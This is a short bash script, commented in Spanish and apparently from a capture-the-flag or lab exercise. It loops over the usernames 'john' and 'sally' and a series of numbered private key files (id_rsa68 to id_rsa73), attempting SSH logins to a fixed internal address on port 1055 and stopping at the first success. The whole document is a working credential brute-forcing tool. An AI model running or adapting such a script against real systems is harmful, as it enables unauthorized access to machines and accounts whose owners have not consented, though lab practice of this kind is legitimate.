#!/bin/bash

users=("john" "sally")  # Lista de usuarios a probar
key_file_prefix="id_rsa"  # Prefijo del nombre del archivo id_rsa
key_file_extension=""  # Extensión del archivo id_rsa

for user in "${users[@]}"
do
        for ((i=68; i<=73; i++))
        do
        key_file="${key_file_prefix}${i}${key_file_extension}"

        echo "Probando con usuario: $user y archivo: $key_file"

        # Intenta hacer login con el archivo id_rsa correspondiente al usuario actual
        ssh -i "$key_file" "$user"@10.150.150.55 -p 1055

        # Verifica el estado de salida del comando ssh
        if [ $? -eq 0 ]; then
                echo "¡Acceso exitoso con usuario: $user y archivo: $key_file!"
                break  # Sale del bucle si se encuentra una combinación exitosa
        else
                echo "Acceso fallido con usuario: $user y archivo: $key_file"
        fi
        echo
        done
done
